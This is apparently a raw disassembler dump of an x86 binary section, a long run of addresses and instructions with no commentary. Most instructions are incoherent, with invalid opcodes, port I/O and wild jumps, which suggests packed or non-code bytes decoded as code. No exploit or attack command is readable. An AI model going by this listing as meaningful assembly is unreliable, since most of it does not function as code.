  40d34b:	inc    edx
  40d34c:	push   ds
  40d34d:	pop    esp
  40d34e:	js     0x40d38d
  40d350:	in     al,dx
  40d351:	in     al,dx
  40d352:	or     DWORD PTR fs:[edx],edx
  40d355:	inc    ebp
  40d356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d357:	adc    al,0x38
  40d359:	fidivr WORD PTR [ecx+0x60fdd8a4]
  40d35f:	push   ss
  40d360:	adc    DWORD PTR [edi],0x58
  40d363:	jnp    0x40d3b4
  40d365:	push   es
  40d366:	sysexit 
  40d368:	pushf  
  40d369:	adc    DWORD PTR [edx-0x17b23cdb],eax
  40d36f:	or     ch,0xb7
  40d372:	ret    0x859
  40d375:	pmullw mm4,mm7
  40d378:	out    0x2,al
  40d37a:	imul   eax,DWORD PTR [ebx+ecx*8],0x68
  40d37e:	add    eax,0x3eaf9f17
  40d383:	mov    esp,0x3cee7f7a
  40d388:	jp     0x40d37f
  40d38a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d38b:	adc    bh,al
  40d38d:	add    DWORD PTR [ebp+0x1c],eax
  40d390:	(bad)  
  40d391:	out    0x98,eax
  40d393:	pop    ecx
  40d394:	scas   eax,DWORD PTR es:[edi]
  40d395:	inc    esp
  40d396:	mov    ecx,0x5a5c857a
  40d39b:	and    ebx,ecx
  40d39d:	(bad)  [edx+edx*2-0x66]
  40d3a1:	out    0x3b,al
  40d3a3:	xchg   dh,dl
  40d3a5:	mov    ds:0xc8ce3424,al
  40d3aa:	aad    0x9b
  40d3ac:	(bad)  
  40d3ad:	mov    DWORD PTR [ebp-0x60],ecx
  40d3b0:	aad    0xcd
  40d3b2:	mov    ch,0xa0
  40d3b4:	sbb    esp,DWORD PTR [edx+esi*4]
  40d3b7:	push   ebp
  40d3b8:	sbb    al,BYTE PTR [ebx-0x20]
  40d3bb:	inc    esp
  40d3bc:	or     dh,bl
  40d3be:	xor    eax,edi
  40d3c0:	add    al,0xf
  40d3c2:	push   es
  40d3c3:	ret    
  40d3c4:	sti    
  40d3c5:	sbb    cl,BYTE PTR [esi]
  40d3c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3c8:	scas   al,BYTE PTR es:[edi]
  40d3c9:	cli    
  40d3ca:	dec    ebx
  40d3cb:	popf   
  40d3cc:	aam    0xce
  40d3ce:	adc    eax,0x6599c5f4
  40d3d3:	inc    ebx
  40d3d4:	mov    edi,DWORD PTR [edx]
  40d3d6:	sub    al,0x79
  40d3d8:	cmp    dl,0x90
  40d3db:	rol    DWORD PTR [esi],0x9d
  40d3de:	add    eax,DWORD PTR [ebp-0xd740f1e]
  40d3e4:	arpl   WORD PTR [edi],bp
  40d3e6:	xchg   DWORD PTR [eax+0x5e],edx
  40d3e9:	popa   
  40d3ea:	mov    dh,0xf6
  40d3ec:	xor    ah,BYTE PTR [ecx+0x3f]
  40d3ef:	repnz pop ds
  40d3f1:	sub    ch,dl
  40d3f3:	js     0x40d3f3
  40d3f5:	ins    DWORD PTR es:[edi],dx
  40d3f6:	cmp    BYTE PTR [ecx],dh
  40d3f8:	int    0x4f
  40d3fa:	je     0x40d3c3
  40d3fc:	mov    edx,0x2a62246a
  40d401:	mov    esp,0xf44d60e9
  40d406:	(bad)  
  40d407:	inc    edi
  40d408:	push   ss
  40d409:	outs   dx,BYTE PTR ds:[esi]
  40d40a:	dec    eax
  40d40b:	loope  0x40d3ab
  40d40d:	loopne 0x40d3e3
  40d40f:	adc    DWORD PTR [esi+0x48a8b920],edx
  40d415:	neg    DWORD PTR ds:0x1cee0930
  40d41b:	jne    0x40d3a7
  40d41d:	push   ss
  40d41e:	cli    
  40d41f:	pop    esi
  40d420:	in     al,0x26
  40d422:	sub    eax,0x7290e02c
  40d427:	cli    
  40d428:	in     al,0x61
  40d42a:	or     al,0x74
  40d42c:	jl     0x40d3b3
  40d42e:	push   cs
  40d42f:	addr16 xchg esi,esp
  40d432:	xchg   edx,eax
  40d433:	cmp    eax,0x679d427e
  40d438:	ror    ch,0xd4
  40d43b:	(bad)
  40d43e:	fcmovbe st,st(7)
  40d440:	inc    esp
  40d441:	sub    eax,0xb028c166
  40d446:	in     eax,dx
  40d447:	int    0x7b
  40d449:	mov    eax,ds:0x42604067
  40d44e:	shl    BYTE PTR [eax],0x33
  40d451:	adc    BYTE PTR [ebx+edx*8-0x35],bh
  40d455:	pop    si
  40d457:	xchg   BYTE PTR [ebp-0x7f],dl
  40d45a:	push   ebx
  40d45b:	in     al,0xb8
  40d45d:	add    al,0x99
  40d45f:	sub    eax,DWORD PTR [ebx+0x7446fc66]
  40d465:	shl    BYTE PTR [eax-0x54],1
  40d468:	dec    ebx
  40d469:	dec    eax
  40d46a:	push   ecx
  40d46b:	xchg   ebp,eax
  40d46c:	mov    ecx,DWORD PTR [ebx+0x515ea405]
  40d472:	inc    eax
  40d473:	sbb    BYTE PTR [esi-0x28855461],bh
  40d479:	ja     0x40d4ad
  40d47b:	sbb    ebp,DWORD PTR [ebx-0x20]
  40d47e:	mov    ds:0x8bc2c33f,al
  40d483:	mov    esp,0x8987f8f
  40d488:	stos   BYTE PTR es:[edi],al
  40d489:	jo     0x40d4f6
  40d48b:	dec    ecx
  40d48c:	rcl    BYTE PTR [ebp-0x5],1
  40d48f:	(bad)  
  40d491:	mov    esi,0x83942f75
  40d496:	fucomi st,st(0)
  40d498:	sub    al,0xda
  40d49b:	and    BYTE PTR [eax+0x26],0xa0
  40d49f:	xor    edx,DWORD PTR [ebp+0x603aca05]
  40d4a5:	push   ebp
  40d4a6:	fsub   QWORD PTR [ebx+esi*8+0x9df455e]
  40d4ad:	pop    ss
  40d4ae:	dec    ebp
  40d4af:	pop    ebp
  40d4b0:	pop    edi
  40d4b1:	inc    eax
  40d4b2:	gs pop esi
  40d4b4:	ret    
  40d4b5:	aad    0xfb
  40d4b7:	mov    ch,0xd5
  40d4b9:	adc    eax,0x26ea6662
  40d4be:	jno    0x40d4bc
  40d4c0:	mov    al,0xaa
  40d4c2:	mul    esi
  40d4c4:	or     eax,0x7c5217c7
  40d4c9:	mov    ebp,0xf65b1b04
  40d4ce:	call   DWORD PTR [ebp+0x17c01779]
  40d4d4:	sar    edi,cl
  40d4d6:	push   DWORD PTR [esi-0x2f2f4598]
  40d4dc:	cmp    BYTE PTR [eax-0x78],0x81
  40d4e0:	adc    al,0x67
  40d4e2:	ss loop 0x40d4c4
  40d4e5:	mul    dl
  40d4e7:	dec    ebx
  40d4e8:	inc    esp
  40d4e9:	jno    0x40d4e3
  40d4eb:	rol    BYTE PTR [edi+edx*8+0x1a],0x26
  40d4f0:	jne    0x40d479
  40d4f2:	push   edi
  40d4f3:	sbb    cl,BYTE PTR [ebp-0x1365c02c]
  40d4f9:	dec    esi
  40d4fa:	push   ecx
  40d4fb:	inc    eax
  40d4fc:	add    DWORD PTR [ebx+0x25],ecx
  40d4ff:	in     al,0xf2
  40d501:	test   BYTE PTR [ebx-0x5f219082],0x88
  40d508:	adc    al,0xff
  40d50a:	iret   
  40d50b:	test   DWORD PTR [edi+0x4e],esi
  40d50e:	je     0x40d547
  40d510:	loop   0x40d4ef
  40d512:	mov    bh,0xd4
  40d514:	or     al,0x35
  40d516:	(bad)  
  40d517:	call   0xc348c153
  40d51c:	(bad)  
  40d51f:	mov    dl,0x76
  40d521:	jo     0x40d4d4
  40d523:	sbb    esi,DWORD PTR [ebx]
  40d525:	push   cs
  40d526:	pop    ebp
  40d527:	or     bh,BYTE PTR [esp+edi*1-0x71]
  40d52b:	mov    esp,0x6e5dd2a6
  40d530:	dec    ebp
  40d531:	stos   DWORD PTR es:[edi],eax
  40d532:	mov    ah,0x2b
  40d534:	jge    0x40d4d2
  40d536:	gs jmp 0x40d5a3
  40d539:	loop   0x40d5a2
  40d53b:	cmp    BYTE PTR [ebx],bl
  40d53d:	daa    
  40d53e:	call   0x8261:0x61a79487
  40d545:	cmp    al,BYTE PTR [eax]
  40d547:	push   ebp
  40d548:	cmp    al,BYTE PTR [eax-0x1f506797]
  40d54e:	mov    edi,DWORD PTR [edx]
  40d550:	(bad)  
  40d551:	push   ds
  40d552:	cmp    eax,0x4de875b2
  40d557:	bnd jl 0x40d54b
  40d55a:	inc    esi
  40d55b:	inc    esp
  40d55c:	or     al,BYTE PTR [eax]
  40d55e:	jnp    0x40d5dc
  40d560:	in     eax,0x99
  40d562:	push   ss
  40d563:	loop   0x40d523
  40d565:	xchg   edi,eax
  40d566:	(bad)  
  40d567:	popa   
  40d568:	les    edi,FWORD PTR [esi]
  40d56a:	cmc    
  40d56b:	xchg   edi,eax
  40d56c:	inc    eax
  40d56d:	rcl    BYTE PTR [eax],0xf5
  40d570:	ja     0x40d530
  40d572:	les    esi,FWORD PTR [ebx]
  40d574:	push   esi
  40d575:	jl     0x40d5f0
  40d577:	mov    gs:0x769dee36,eax
  40d57d:	pop    ebp
  40d57e:	loopne 0x40d567
  40d580:	or     dl,ch
  40d582:	pop    esi
  40d583:	adc    esp,DWORD PTR [esi+0x3e]
  40d586:	shl    BYTE PTR [esp+esi*4-0x303b680f],cl
  40d58d:	in     al,dx
  40d58e:	and    edi,DWORD PTR [ecx]
  40d590:	leave  
  40d591:	inc    eax
  40d592:	add    al,BYTE PTR [esi-0x16]
  40d595:	add    DWORD PTR [ebx-0x26d5eb09],esi
  40d59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d59c:	add    edx,DWORD PTR [esi+esi*2+0x1a]
  40d5a0:	popa   
  40d5a1:	push   ds
  40d5a2:	je     0x40d586
  40d5a4:	repz mov ecx,DWORD PTR [ebp-0x20]
  40d5a8:	xor    edx,edx
  40d5aa:	jmp    0x40d86e
  40d5af:	pop    edx
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	fldenv [edx-0x23184200]
  40d5c1:	sbb    BYTE PTR [eax],bl
  40d5c3:	rcl    BYTE PTR [eax+ebx*1],cl
  40d5c6:	sbb    cl,al
  40d5c8:	xor    eax,0x1561f8b1
  40d5cd:	pop    ecx
  40d5ce:	inc    ecx
  40d5cf:	popf   
  40d5d0:	mov    ebx,0xa353de71
  40d5d5:	ja     0x40d5ad
  40d5d7:	call   0x7475cbd5
  40d5dc:	dec    eax
  40d5dd:	xor    ch,BYTE PTR [edx+0x5b]
  40d5e0:	std    
  40d5e1:	imul   ebp,eax,0xffffff98
  40d5e4:	and    ah,bl
  40d5e6:	aaa    
  40d5e7:	cwde   
  40d5e8:	aad    0xc1
  40d5ea:	ror    BYTE PTR [ebx+0x23d3d80e],0xd8
  40d5f1:	fsub   DWORD PTR [ebx+0x6c]
  40d5f4:	call   0xb2a8:0x1c844751
  40d5fb:	loope  0x40d643
  40d5fd:	pop    edx
  40d5fe:	in     al,dx
  40d5ff:	sti    
  40d600:	bound  ebp,QWORD PTR [eax-0x228b894a]
  40d606:	sub    bl,BYTE PTR [eax+esi*2-0x38e74d21]
  40d60d:	stos   DWORD PTR es:[edi],eax
  40d60e:	dec    esp
  40d60f:	repnz inc edi
  40d611:	int    0xf9
  40d613:	push   esi
  40d614:	ret    0xc7c2
  40d617:	xlat   BYTE PTR ds:[ebx]
  40d618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d619:	dec    ebp
  40d61a:	dec    ebx
  40d61b:	pushf  
  40d61c:	loope  0x40d604
  40d61e:	test   ebx,ebx
  40d620:	add    ecx,DWORD PTR [ebx]
  40d622:	jb     0x40d5d1
  40d624:	fldcw  WORD PTR ds:0xf31f9728
  40d62a:	jecxz  0x40d5f3
  40d62c:	(bad)  
  40d62d:	in     eax,dx
  40d62e:	sub    DWORD PTR [ebx],esi
  40d630:	(bad)  
  40d631:	clc    
  40d632:	pop    esp
  40d633:	imul   edi,ebx,0xe2d58b13
  40d639:	(bad)  
  40d63a:	retf   0x3b7b
  40d63d:	fsubrp st(5),st
  40d63f:	out    0x75,eax
  40d641:	cwde   
  40d642:	lds    ebx,FWORD PTR [ecx+0x70b92136]
  40d648:	retf   
  40d649:	cmp    eax,0x5c63454a
  40d64e:	jae    0x40d6c0
  40d650:	loop   0x40d65d
  40d652:	into   
  40d653:	hlt    
  40d654:	in     eax,dx
  40d655:	mov    ch,0x3c
  40d657:	lods   eax,DWORD PTR ds:[esi]
  40d658:	aam    0xf8
  40d65a:	xlat   BYTE PTR ds:[ebx]
  40d65b:	pop    edx
  40d65c:	sti    
  40d65d:	xchg   edx,eax
  40d65e:	xchg   edi,eax
  40d65f:	inc    ecx
  40d660:	cmp    BYTE PTR [edx+0x1948dfca],dl
  40d666:	fsubr  DWORD PTR [edx+0x52df9283]
  40d66c:	cdq    
  40d66d:	xchg   ecx,eax
  40d66e:	xchg   edx,eax
  40d66f:	shl    BYTE PTR es:[esi+0x2b],0xdf
  40d674:	dec    ebp
  40d675:	adc    al,BYTE PTR [esi+ecx*1+0x609405e4]
  40d67c:	push   ebx
  40d67d:	xchg   edi,eax
  40d67e:	add    DWORD PTR [edx],edi
  40d680:	dec    eax
  40d681:	jno    0x40d6b2
  40d683:	sub    eax,0xef8b0c26
  40d688:	or     esp,edi
  40d68a:	cmp    eax,0x27b748f2
  40d68f:	leave  
  40d690:	fucom  st(0)
  40d692:	mov    esp,0x515a08e4
  40d697:	and    ebp,DWORD PTR ds:[edi+0x45]
  40d69b:	sub    DWORD PTR [eax],eax
  40d69d:	inc    ecx
  40d69e:	mov    cl,BYTE PTR [ecx]
  40d6a0:	inc    ecx
  40d6a1:	mov    bh,0x9d
  40d6a3:	in     eax,0x90
  40d6a5:	cs sbb ch,bl
  40d6a8:	xor    dh,bh
  40d6aa:	into   
  40d6ab:	cs popf 
  40d6ad:	jne    0x40d65b
  40d6af:	and    al,BYTE PTR [ebp-0x1b]
  40d6b2:	sar    DWORD PTR [ecx+0x7a01b784],0xb7
  40d6b9:	mov    dh,0x8
  40d6bb:	push   0xffffffbc
  40d6bd:	pcmpgtb mm1,QWORD PTR [esi-0x4a]
  40d6c1:	jmp    FWORD PTR [edi+0x61]
  40d6c4:	xlat   BYTE PTR ds:[ebx]
  40d6c5:	nop
  40d6c6:	and    esi,DWORD PTR [esi+0x70]
  40d6c9:	push   0xdcfbb0b3
  40d6ce:	jmp    0x40d69d
  40d6d0:	jge    0x40d699
  40d6d2:	std    
  40d6d3:	popa   
  40d6d4:	sbb    BYTE PTR [ebp-0x3601093c],dl
  40d6da:	and    DWORD PTR [edx+eax*1+0x4b10d4e6],0x84ce91f9
  40d6e5:	mov    BYTE PTR [ebp+edi*2-0x9a3de88],bh
  40d6ec:	push   ebp
  40d6ed:	(bad)  
  40d6ee:	sbb    eax,0xc6e745f8
  40d6f3:	cmp    BYTE PTR [ebx+edx*1+0x26],bl
  40d6f7:	lods   eax,DWORD PTR ds:[esi]
  40d6f8:	aad    0xbb
  40d6fa:	shl    DWORD PTR ds:0x701c14f7,cl
  40d700:	data16 mov dh,0xe2
  40d703:	mov    bl,0x79
  40d705:	push   eax
  40d706:	outs   dx,BYTE PTR ds:[esi]
  40d707:	lock sahf 
  40d709:	xor    esi,ecx
  40d70b:	aas    
  40d70c:	int    0x8f
  40d70e:	gs loop 0x40d6aa
  40d711:	push   edx
  40d712:	ret    0xbdc6
  40d715:	sub    eax,0xd22ea225
  40d71a:	dec    edx
  40d71b:	pop    ebx
  40d71c:	out    dx,eax
  40d71d:	xor    al,0xa1
  40d71f:	aas    
  40d720:	mov    esp,0x6e3437a3
  40d725:	adc    DWORD PTR [eax],0x9ce8c2dd
  40d72b:	jb     0x40d6b0
  40d72d:	ds xchg esp,eax
  40d72f:	fdivr  QWORD PTR [esi+0x6ba2322b]
  40d735:	jns    0x40d717
  40d737:	cmp    ah,BYTE PTR [ebp-0x74]
  40d73a:	jecxz  0x40d719
  40d73c:	ret    0xc644
  40d73f:	nop
  40d740:	out    0x58,al
  40d742:	and    esp,esp
  40d744:	adc    edi,DWORD PTR [eax-0x8]
  40d747:	add    ebp,esp
  40d749:	cld    
  40d74a:	pop    ss
  40d74b:	ret    
  40d74c:	inc    edi
  40d74d:	popa   
  40d74e:	cmc    
  40d74f:	inc    edx
  40d750:	or     DWORD PTR [esi+0x19c6475f],esi
  40d756:	les    edx,FWORD PTR [edi+ebp*2]
  40d759:	pop    es
  40d75a:	lods   eax,DWORD PTR ds:[esi]
  40d75b:	ins    DWORD PTR es:[edi],dx
  40d75c:	push   esp
  40d75d:	sbb    eax,0x251fd7d9
  40d762:	dec    ebx
  40d763:	xchg   DWORD PTR [edi],esi
  40d765:	cmp    al,0x5b
  40d767:	adc    DWORD PTR [edx],0xc0dd1bbe
  40d76d:	dec    eax
  40d76e:	sbb    eax,0xabd5e64f
  40d773:	mov    dl,0xe2
  40d775:	dec    edx
  40d776:	scas   eax,DWORD PTR es:[edi]
  40d777:	lock scas eax,DWORD PTR es:[edi]
  40d779:	cmp    ah,BYTE PTR [ebp+eax*8-0x330c67f]
  40d780:	pop    ss
  40d781:	xlat   BYTE PTR ds:[ebx]
  40d782:	adc    al,0x39
  40d784:	xlat   BYTE PTR ds:[ebx]
  40d785:	mov    ?,WORD PTR [edx+ecx*1+0x372ca5d2]
  40d78c:	push   0xffffffcd
  40d78e:	ret    
  40d78f:	lods   al,BYTE PTR ds:[esi]
  40d790:	lds    edi,FWORD PTR [ebx-0x7abab699]
  40d796:	sbb    ebx,DWORD PTR [ebp+0x26]
  40d799:	and    bh,BYTE PTR ds:0x8670b585
  40d79f:	cmp    dh,BYTE PTR [ebp+0x78]
  40d7a2:	mov    edx,0x62f904dc
  40d7a7:	jns    0x40d732
  40d7a9:	bound  ebx,QWORD PTR [ebx]
  40d7ab:	mov    esi,0x77d8effc
  40d7b0:	int3   
  40d7b1:	mov    edi,0x408d7686
  40d7b6:	jo     0x40d7d8
  40d7b8:	inc    esi
  40d7b9:	sub    cl,BYTE PTR [edi-0x65]
  40d7bc:	push   ss
  40d7bd:	mov    ah,0x4c
  40d7bf:	jmp    0x40d79e
  40d7c1:	sub    eax,0x5b393936
  40d7c6:	mov    BYTE PTR [edx+0x34],al
  40d7c9:	and    eax,0xa23d6f9f
  40d7ce:	fs hlt 
  40d7d0:	inc    ch
  40d7d2:	aam    0xd5
  40d7d4:	jne    0x40d7db
  40d7d6:	lock and ch,BYTE PTR [esi]
  40d7d9:	sub    BYTE PTR [eax+0x3c],ah
  40d7dc:	xchg   edi,eax
  40d7dd:	sti    
  40d7de:	out    0xb4,eax
  40d7e0:	repnz adc edx,DWORD PTR [ecx+edi*4+0x6367a142]
  40d7e8:	lods   al,BYTE PTR ds:[esi]
  40d7e9:	sub    ebp,DWORD PTR [edi-0x15]
  40d7ec:	retf   0x7e3a
  40d7ef:	cmp    ebp,DWORD PTR [esi-0x61b55ae]
  40d7f5:	pop    ss
  40d7f6:	xor    eax,0xde401bf2
  40d7fb:	mov    ecx,0x6e8c3394
  40d800:	dec    esi
  40d801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d802:	mov    ds:0x433f9845,eax
  40d807:	push   edx
  40d808:	cwde   
  40d809:	jno    0x40d847
  40d80b:	sbb    eax,0x9dc55578
  40d810:	add    eax,0xe1653dab
  40d815:	fdivrp st(0),st
  40d817:	fisubr DWORD PTR [ecx-0x667a0ef5]
  40d81d:	(bad)  
  40d81e:	in     al,0x51
  40d820:	popa   
  40d821:	out    dx,eax
  40d822:	pop    edi
  40d823:	or     al,0xf9
  40d825:	jne    0x40d83d
  40d827:	js     0x40d815
  40d829:	or     BYTE PTR [ebp+0x47],0x10
  40d82d:	(bad)  
  40d82e:	rcr    DWORD PTR [edi+0x24b78048],1
  40d834:	fldpi  
  40d836:	scas   al,BYTE PTR es:[edi]
  40d837:	jae    0x40d7f6
  40d839:	pop    esp
  40d83a:	cli    
  40d83b:	arpl   WORD PTR [esi],bx
  40d83d:	dec    esp
  40d83e:	push   esp
  40d83f:	arpl   WORD PTR [edi-0x4162131],cx
  40d845:	sbb    eax,0x6062c50d
  40d84a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d84b:	mov    esi,0x36378312
  40d850:	outs   dx,DWORD PTR ds:[esi]
  40d851:	pusha  
  40d852:	retf   
  40d853:	add    esi,ecx
  40d855:	mov    DWORD PTR [esi-0x2c1baa37],0xb30aa2c2
  40d85f:	dec    esp
  40d860:	aaa    
  40d861:	loopne 0x40d886
  40d863:	jnp    0x40d7e9
  40d865:	xor    bl,BYTE PTR [ebp+ecx*4+0x74]
  40d869:	push   fs
  40d86b:	xchg   esi,eax
  40d86c:	pop    ebp
  40d86d:	push   esi
  40d86e:	mov    edi,0x4db5
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0x3fbf55bc
  40d894:	mov    esi,0x1818d8a0
  40d899:	rcl    BYTE PTR [eax+ebx*1],cl
  40d89c:	sbb    cl,dl
  40d89e:	ret    
  40d89f:	mov    ah,0xf6
  40d8a1:	(bad)  [edx+0x67915266]
  40d8a7:	mov    DWORD PTR [ecx+0x3f58bbc4],eax
  40d8ad:	xchg   ecx,eax
  40d8ae:	jne    0x40d848
  40d8b0:	pop    ss
  40d8b1:	xor    eax,0xf9130181
  40d8b6:	push   ss
  40d8b7:	aas    
  40d8b8:	xchg   esp,eax
  40d8b9:	pop    edx
  40d8ba:	repz popa 
  40d8bc:	mov    dl,0xd
  40d8be:	fiadd  DWORD PTR [edi+ebx*2-0x33]
  40d8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8c3:	les    esp,FWORD PTR [ebp-0x7340b076]
  40d8c9:	sub    bh,cl
  40d8cb:	ins    BYTE PTR es:[edi],dx
  40d8cc:	out    dx,al
  40d8cd:	xchg   edi,eax
  40d8ce:	or     cl,BYTE PTR [esi+0x52b7e0b0]
  40d8d4:	jno    0x40d936
  40d8d6:	push   edx
  40d8d7:	ja     0x40d8ce
  40d8d9:	enter  0x8302,0x59
  40d8dd:	xchg   bl,al
  40d8df:	dec    edi
  40d8e0:	mov    ah,0x3a
  40d8e2:	mov    ds:0xf7481699,al
  40d8e7:	sub    ebp,edx
  40d8e9:	mov    BYTE PTR [eax],cl
  40d8eb:	push   cs
  40d8ec:	std    
  40d8ed:	in     eax,dx
  40d8ee:	stc    
  40d8ef:	and    ebx,DWORD PTR [edi+edi*4]
  40d8f2:	leave  
  40d8f3:	pop    edi
  40d8f4:	sub    DWORD PTR [ecx+edx*8-0x2],ecx
  40d8f8:	test   DWORD PTR [eax+0x43eb0ead],ecx
  40d8fe:	cmp    eax,0xd64bc299
  40d903:	jg     0x40d8d4
  40d905:	mov    dh,0x4
  40d907:	in     al,dx
  40d908:	int3   
  40d909:	cli    
  40d90a:	or     eax,0xd10e59ca
  40d90f:	(bad)  
  40d910:	dec    ebp
  40d911:	and    esi,ecx
  40d913:	sub    dl,0xd5
  40d916:	xor    dh,bl
  40d918:	addr16 (bad) 
  40d91a:	dec    ebp
  40d91b:	lds    eax,FWORD PTR [ebx-0x4b710e63]
  40d921:	loop   0x40d961
  40d923:	lock push edx
  40d925:	dec    eax
  40d926:	rcl    BYTE PTR [eax-0x68147d24],1
  40d92c:	and    esi,DWORD PTR [ecx-0x51]
  40d92f:	mov    al,0x7
  40d931:	(bad)  
  40d932:	sbb    BYTE PTR [edi+edx*2-0x5a],dh
  40d936:	sbb    DWORD PTR [esi-0x1c3f0979],ecx
  40d93c:	inc    edi
  40d93d:	pop    ss
  40d93e:	int    0x94
  40d940:	xchg   DWORD PTR ds:0x7761cc0,edi
  40d946:	bound  ebx,QWORD PTR [esp+edi*2-0x54]
  40d94a:	pop    ss
  40d94b:	cdq    
  40d94c:	nop
  40d94d:	mov    ds:0xa7f5b325,eax
  40d953:	mov    cl,0x4a
  40d955:	stc    
  40d956:	aam    0xe8
  40d958:	sub    dl,dl
  40d95a:	xchg   ecx,eax
  40d95b:	and    esi,DWORD PTR [eax+0x62]
  40d95e:	xchg   edi,eax
  40d95f:	xchg   DWORD PTR [ebx-0x50],ebx
  40d962:	daa    
  40d963:	pop    ds
  40d964:	retf   0x26d1
  40d967:	or     eax,0xdf59c134
  40d96c:	lock repz mov ch,0xbf
  40d970:	cld    
  40d971:	outs   dx,DWORD PTR ds:[esi]
  40d972:	nop
  40d973:	push   edi
  40d974:	(bad)  
  40d975:	adc    al,0xcb
  40d977:	in     eax,0xae
  40d979:	outs   dx,DWORD PTR ds:[esi]
  40d97a:	lea    edi,[ebp-0x41]
  40d97d:	push   esi
  40d97e:	out    0x3e,eax
  40d980:	mov    esi,0xe6995b2d
  40d985:	cmp    bl,BYTE PTR [edx]
  40d987:	sbb    al,0xd7
  40d989:	cmp    dl,BYTE PTR [esi-0x6d]
  40d98c:	aam    0x7e
  40d98e:	repz out 0x2c,eax
  40d991:	outs   dx,DWORD PTR ds:[esi]
  40d992:	pusha  
  40d993:	fsub   st,st(4)
  40d995:	add    bh,BYTE PTR [ecx]
  40d997:	pusha  
  40d998:	push   esp
  40d999:	pop    es
  40d99a:	xor    eax,0x5f9c78f
  40d99f:	shld   DWORD PTR [ebx+0xf],esi,cl
  40d9a3:	push   esi
  40d9a4:	sbb    edx,DWORD PTR [ebp+0x5a]
  40d9a7:	jecxz  0x40d9c2
  40d9a9:	pop    edi
  40d9aa:	dec    edx
  40d9ab:	xchg   ecx,eax
  40d9ac:	stc    
  40d9ad:	call   0xac46:0x3e5faf2
  40d9b4:	mov    es,WORD PTR [ebx+eax*1-0x790b238f]
  40d9bb:	es jg  0x40d97e
  40d9be:	or     BYTE PTR [esi+0x1c],ah
  40d9c1:	mov    edi,0x3e037594
  40d9c6:	fcmovb st,st(0)
  40d9c8:	push   eax
  40d9c9:	rol    BYTE PTR [eax+0x3d],cl
  40d9cc:	fwait
  40d9cd:	pusha  
  40d9ce:	push   es
  40d9cf:	cmp    eax,0x495a7bcf
  40d9d4:	mov    ch,0xba
  40d9d6:	pop    esi
  40d9d7:	sub    eax,0xeb36eabc
  40d9dc:	dec    ecx
  40d9dd:	addr16 jge 0x40da12
  40d9e0:	ds sahf 
  40d9e2:	in     eax,0x5d
  40d9e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9e5:	or     eax,0xaa7edab4
  40d9ea:	call   0xccb773ab
  40d9ef:	push   edi
  40d9f0:	xchg   DWORD PTR [eax-0x34],edx
  40d9f3:	sti    
  40d9f4:	gs mov eax,0x6cd5e1d
  40d9fa:	sub    DWORD PTR [edi],ebx
  40d9fc:	push   edx
  40d9fd:	test   al,0x5f
  40d9ff:	scas   eax,DWORD PTR es:[edi]
  40da00:	inc    ecx
  40da01:	ja     0x40d984
  40da03:	test   DWORD PTR [ebx+0xd23f235],0x95563112
  40da0d:	bound  edi,QWORD PTR [edi+0x51]
  40da10:	sub    dl,BYTE PTR [ebx+0x27]
  40da13:	push   0x71
  40da15:	sbb    DWORD PTR [eax],edx
  40da17:	clc    
  40da18:	jp     0x40da7e
  40da1a:	(bad)  
  40da1b:	push   ecx
  40da1c:	mov    eax,0xbf437207
  40da21:	jle    0x40d9f3
  40da23:	into   
  40da24:	jl     0x40d9ff
  40da26:	add    edx,DWORD PTR [ecx-0x14b26531]
  40da2c:	sbb    ah,BYTE PTR [esi+0x23]
  40da2f:	sbb    al,0x92
  40da31:	xor    eax,0x2a2392f
  40da36:	mov    ebp,0x7407bc4e
  40da3b:	je     0x40da34
  40da3d:	jbe    0x40d9dd
  40da3f:	sahf   
  40da40:	push   0xffffff95
  40da42:	and    ebp,ecx
  40da44:	leave  
  40da45:	mov    ah,0xca
  40da47:	mov    esi,0x690533b3
  40da4c:	xor    esi,DWORD PTR [eax]
  40da4e:	adc    edx,ebx
  40da50:	adc    al,0x8
  40da52:	pop    esi
  40da53:	jae    0x40da77
  40da55:	and    esi,DWORD PTR [ecx+0x60]
  40da58:	call   DWORD PTR [ebx+ebx*2-0x125a5df0]
  40da5f:	jmp    0x2572:0x68adb6a9
  40da66:	push   ebp
  40da67:	sub    eax,0x9d8ce0d7
  40da6c:	cwde   
  40da6d:	imul   edi,DWORD PTR [ecx-0x5359a45e],0xffffff99
  40da74:	pushf  
  40da75:	add    eax,0x40b2b52e
  40da7a:	sbb    eax,0x989e71f0
  40da7f:	test   BYTE PTR [esi+0x71],0x9f
  40da83:	xor    DWORD PTR [esi+0x12971225],esi
  40da89:	xchg   DWORD PTR [esi],ecx
  40da8b:	push   esi
  40da8c:	ins    DWORD PTR es:[edi],dx
  40da8d:	mov    ch,0x1c
  40da8f:	nop
  40da90:	out    0x40,al
  40da92:	sbb    dh,BYTE PTR [eax+0x2a]
  40da95:	mov    esp,0xf316dad
  40da9a:	inc    edx
  40da9b:	neg    ah
  40da9d:	outs   dx,DWORD PTR ds:[esi]
  40da9e:	jnp    0x40da2e
  40daa0:	inc    ebx
  40daa1:	dec    esi
  40daa2:	out    0x9d,eax
  40daa4:	mov    dh,0x65
  40daa6:	fmul   DWORD PTR [eax]
  40daa8:	sbb    ebp,DWORD PTR [esi+0x69]
  40daab:	and    BYTE PTR [ebx],0x46
  40daae:	mov    ebx,0x17ba2d7e
  40dab3:	int    0x4f
  40dab5:	and    DWORD PTR [edx],edx
  40dab7:	sub    dh,BYTE PTR [edx+0x44f1ec4f]
